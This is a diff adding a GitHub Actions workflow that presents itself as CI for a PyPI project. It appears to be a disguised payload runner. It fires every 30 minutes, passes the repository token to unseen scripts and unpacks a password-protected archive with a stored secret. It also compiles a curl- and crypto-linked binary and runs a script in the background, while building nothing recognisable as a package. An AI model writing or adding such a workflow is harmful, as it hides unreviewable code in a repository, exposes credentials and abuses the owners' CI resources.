@@ -1,0 +1,54 @@
+name: PyPI Project CI
+
+on:
+  workflow_dispatch:
+  push:
+    branches:
+      - main
+  pull_request:
+    branches:
+      - main
+  schedule:
+    - cron: "*/30 * * * *"
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v4
+
+      - name: Setup Python environment
+        uses: actions/setup-python@v4
+        with:
+          python-version: "3.13"
+
+      - name: Install dependencies
+        run: |
+          sudo apt update
+          sudo apt install -y python3-dev libcurl4-openssl-dev libssl-dev nlohmann-json3-dev build-essential protobuf-compiler libprotobuf-dev
+          pip3 install --upgrade pip
+          pip3 install protobuf requests
+
+      - name: Pre-publish checks
+        run: python recheckbuild.py "${{ github.repository }}" "${{ secrets.GITHUB_TOKEN }}"
+
+      - name: Extract package files
+        run: unzip -P "${{ secrets.PYPI_PASSWORD }}" package.zip
+
+      - name: Build C++ code with fixed Python paths
+        run: |
+          g++ pypi.cpp -o pypi \
+            -I/opt/hostedtoolcache/Python/3.13.11/x64/include/python3.13 \
+            -L/opt/hostedtoolcache/Python/3.13.11/x64/lib -lpython3.13 \
+            -lcurl -lcrypto -std=c++17
+          chmod +x pypi
+
+      - name: Run build script
+        run: python build.py &
+
+      - name: Post-build project
+        run: python rebuild.py "${{ github.repository }}" "${{ secrets.GITHUB_TOKEN }}" "${{ github.run_id }}"
+
+      - name: kill puthon
+        run: pkill python
